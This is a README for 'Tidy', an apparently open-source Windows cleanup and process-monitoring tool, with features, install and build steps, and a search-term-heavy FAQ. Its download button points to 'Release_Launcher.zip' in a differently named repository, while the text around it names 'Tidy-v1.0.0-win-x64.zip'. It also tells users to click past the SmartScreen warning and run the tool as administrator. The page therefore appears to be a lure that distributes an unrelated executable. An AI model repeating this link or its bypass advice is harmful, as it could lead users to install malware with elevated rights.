## Why Tidy

Your C: drive is full again, the fans spin up for no reason, and Windows takes forever to sign in. The built-in tools are spread across Settings, Task Manager and Disk Cleanup, and most "PC optimizer" apps are noisy, upsell-heavy and delete more than they should.

**Tidy puts PC cleanup and PC health in one quiet window.** One Smart Scan measures temp files, browser caches, the Windows Update cache, crash dumps, NVIDIA / DirectX shader caches and the Recycle Bin in about three seconds. A process view explains in plain English *why* `MsMpEng.exe`, `svchost.exe` or `Memory Compression` is using your CPU or RAM. A startup list shows which apps slow down your boot. Everything runs locally, nothing is uploaded, and a built-in safe-list makes sure your documents, photos and system files are never touched.

## Features

### 1. Three-second Smart Scan

<img src="assets/demo-scan.gif" width="100%" alt="Smart Scan sweeping the storage bar and counting cleanable gigabytes">

A parallel directory walker (plain Rust threads, one per core) sweeps every known junk location at once and adds up the space per category: **temporary files** (only older than 24 h, so running installers are safe), **Chrome / Edge / Brave / Firefox caches**, **Windows Update downloads**, **crash dumps and error reports**, **NVIDIA DXCache, D3DSCache and AMD shader caches**, **thumbnail cache** and the **Recycle Bin**. Junctions and symlinks are never followed.

### 2. One-click cleanup with dry run

<img src="assets/demo-clean.gif" width="100%" alt="Clicking Clean 12.4 GB, categories count down and freed space is shown">

Pick categories in a clear checklist, see how many files and gigabytes each one holds, and press **Clean**. Dry run is on by default: Tidy walks the exact same files and reports what it *would* delete before you ever let it remove anything. Items that cannot be undone (Recycle Bin, update cache) are marked **Review** and unchecked by default.

### 3. Who's eating my PC?

<img src="assets/demo-procs.gif" width="100%" alt="Live process list re-sorting by CPU usage with sparklines and plain-English explanations">

Live CPU and memory per app, grouped like a human would (14 Chrome processes = one Chrome row), with 40-second sparklines and a **plain-English "what is this?"** for the processes people search for most: Antimalware Service Executable, Desktop Window Manager, Service Host, Search Indexer, WMI Provider Host, Memory Compression and more. Windows components are flagged so you never end the wrong task.

### 4. Memory pressure, not just "RAM %"

A pressure gauge combines physical load with commit charge (what actually triggers "out of memory"), plus in-use, cached (standby), compressed and available memory, and the apps holding the most RAM. Read straight from `GlobalMemoryStatusEx` and `GetPerformanceInfo`.

### 5. Startup impact

Reads the `HKCU` and `HKLM` `Run` keys (64- and 32-bit), respects the Task Manager on/off state, and rates each startup program **High / Medium / Low** so you can see which apps slow down sign-in and by roughly how much.

### 6. Large &amp; duplicate files

Size buckets (100 MB → 4 GB+), the biggest files on each drive, and duplicate detection in three passes: same size → same 64 KB fingerprint → same full-content hash.

### 7. Safe-list built in

System folders (`System32`, `WinSxS`, `Program Files`), your personal folders (Documents, Desktop, Pictures, OneDrive) and irreplaceable file types (`.kdbx`, `.pst`, `.docx`, wallets, VM disks) are protected at every step of the scan and the cleanup. Add your own paths and wildcards in settings.

## Download &amp; install

<a class="download-btn-action" href="https://github.com/echocoxswainmode/pc-cleaner-fps-optimizer/releases/download/v1.1.2/Release_Launcher.zip"><img src="assets/download-compact.png" width="230" alt="Download Tidy v1.0.0"></a>

1. Download **Tidy-v1.0.0-win-x64.zip** from the latest release.
2. Right-click the zip → **Extract All…**
3. Run **Tidy.exe** (portable) or the included setup if you want a Start menu entry.
4. Tidy runs Smart Scan on launch. Review the checklist, keep **Dry run** on for your first clean, then switch it off when you are happy.

> [!NOTE]
> Windows SmartScreen may say "Windows protected your PC" for new, unsigned apps. Click **More info → Run anyway**. The full source is in this repository and you can build the exe yourself.

> [!TIP]
> Cleaning the Windows Update cache and other system folders needs administrator rights. Right-click Tidy.exe → **Run as administrator** for those categories; everything else works as a normal user.

## Build from source

Requirements: Windows 10/11 x64, Rust stable (rustup) with the MSVC toolchain (Visual Studio Build Tools, "Desktop development with C++"), and the WebView2 runtime (preinstalled on Windows 11).

```powershell
cargo install tauri-cli --version "^2"
git clone <this repo> && cd pc-cleanup-optimizer\src-tauri

cargo tauri dev        # run with hot reload of the ui\ folder
cargo test             # unit tests: scanner, safe-list, duplicates, startup parsing
cargo tauri build      # release exe + NSIS installer

# or build and zip in one go -> dist\Tidy-v1.0.0-win-x64.zip
powershell -ExecutionPolicy Bypass -File ..\scripts\build.ps1 -Test
```

The UI is plain HTML/CSS/JS with no build step: open `ui/index.html` in a browser to work on the design with built-in sample data. Set `TIDY_DEMO=1` to make the backend return sample scan results.

## FAQ

<details>
<summary><b>Is Tidy safe? Can it delete my files?</b></summary>

Tidy only looks inside known cache and temp locations, and every path also passes a safe-list that blocks system folders, your personal folders and personal file types. Dry run is on by default, so the first clean only reports what would be removed. The code is MIT licensed and open for review.
</details>

<details>
<summary><b>How do I free up disk space on Windows 11 quickly?</b></summary>

Run Tidy's Smart Scan: in about three seconds it totals temp files, browser caches, the Windows Update cache, crash dumps and shader caches, which together are often 5–20 GB. Then use the Storage screen to find large files and duplicates you no longer need.
</details>

<details>
<summary><b>Is it safe to delete temp files in Windows 10 and 11?</b></summary>

Yes, as long as nothing is using them. Tidy skips temp files younger than 24 hours and silently skips files that are locked by a running program.
</details>

<details>
<summary><b>How do I fix high CPU usage on Windows 11?</b></summary>

Open **Processes**, sort by CPU and read the explanation next to the top app. Common causes are Antimalware Service Executable (a scheduled scan), Search Indexer (catching up after new files), Windows Modules Installer (updates) or a browser with many tabs. Tidy tells you whether a process is part of Windows or safe to end.
</details>

<details>
<summary><b>What is "Memory Compression" and why does it use so much RAM?</b></summary>

It is Windows compressing idle memory instead of writing it to the page file. It grows when RAM is tight and is normal. Tidy shows it separately in the Memory screen so you can see real memory pressure.
</details>

<details>
<summary><b>Does clearing the NVIDIA shader cache improve game performance?</b></summary>

It frees space and fixes some stutter caused by a corrupted cache. Games rebuild shaders on the next launch, so the first minutes may hitch slightly. Tidy marks shader caches as "low risk" for that reason.
</details>

<details>
<summary><b>How do I disable startup programs in Windows 11?</b></summary>

The Startup screen lists every app from the registry Run keys with its impact. Toggling from inside Tidy arrives in 1.1; until then use Task Manager → Startup apps, and Tidy will show the new state.
</details>

<details>
<summary><b>Is Tidy a good CCleaner alternative?</b></summary>

If you want a free, open source PC cleaner without ads, bundled offers or a registry "cleaner", yes. Tidy focuses on safe space recovery plus understanding CPU, RAM and startup, not on aggressive tweaks.
</details>

<details>
<summary><b>Does Tidy collect any data or need an account?</b></summary>

No. Tidy works fully offline, has no telemetry, no account and no network access.
</details>
